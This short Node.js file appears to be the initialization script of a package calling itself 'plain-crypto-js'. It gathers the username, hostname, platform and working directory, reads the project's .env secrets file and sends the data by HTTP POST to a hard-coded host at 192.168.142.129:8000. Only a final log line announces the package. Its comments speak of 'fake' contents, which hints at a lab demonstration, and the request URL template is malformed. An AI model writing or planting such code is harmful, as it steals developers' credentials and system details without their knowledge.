const http = require("http");
const os = require("os");
const fs = require("fs");
const path = require("path");

let req;

// 1. Rename this to avoid a naming conflict with the file data later
const systemPayload = JSON.stringify({
  user: os.userInfo().username,
  host: os.hostname(),
  platform: process.platform,
  cwd: process.cwd()
});

const npmrc = path.join(os.homedir(), ".npmrc");
const envFile = path.join(process.cwd(), ".env");

if (fs.existsSync(envFile)) {
    const envContent = fs.readFileSync(envFile, "utf8");
    console.log("Found .env content:\n", envContent);
    
    // 2. Safely URL-encode the fake .env contents so it doesn't break the HTTP request
    const encodedEnv = encodeURIComponent(envContent);
    
    req = http.request(
        `http://192.168.142.129:8000{encodedEnv}`,
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                // 3. Set the Content-Length to match the actual payload we are transmitting below
                "Content-Length": Buffer.byteLength(systemPayload) 
            }
        }
    );
}

// 4. Send the payload and close the connection
if (req) {
    req.write(systemPayload);
    req.end();
}

console.log("[plain-crypto-js] initialized");
